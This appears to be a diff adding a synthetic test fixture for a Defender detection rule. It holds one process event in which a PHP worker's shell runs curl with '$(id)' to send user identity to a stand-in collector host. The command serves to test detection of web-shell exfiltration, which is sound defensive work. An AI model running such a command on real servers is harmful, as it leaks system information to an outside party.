@@ -1,0 +1,23 @@
+{
+  "synthetic": true,
+  "source": "synthetic; https://cloud.google.com/blog/topics/threat-intelligence/artex-and-friends-enter-agentic-offensive-frameworks ; https://threatdefence.com/article/artex-agentic-attack-framework-detection-hunting ; https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table ; https://curl.se/docs/manpage.html ; https://www.gnu.org/software/wget/manual/wget.html",
+  "platform": "defender",
+  "table": "DeviceProcessEvents",
+  "label": "malicious",
+  "variant": "PHP worker shells out; command substitution in the parent shell sends id output in the URL",
+  "expect_alert": true,
+  "result": "not run (no KQL runner in this repo). Python mirror of the rule logic applied to these events: alert, matches expectation",
+  "events": [
+    {
+      "Timestamp": "2026-11-26T03:00:00Z",
+      "DeviceId": "synthetic-web03",
+      "DeviceName": "web03.corp.example",
+      "FileName": "curl",
+      "ProcessCommandLine": "curl -s https://collector.example.net/uid=33(www-data)",
+      "AccountName": "www-data",
+      "InitiatingProcessFileName": "sh",
+      "InitiatingProcessCommandLine": "sh -c curl -s https://collector.example.net/$(id)",
+      "InitiatingProcessParentFileName": "php-fpm8.2"
+    }
+  ]
+}
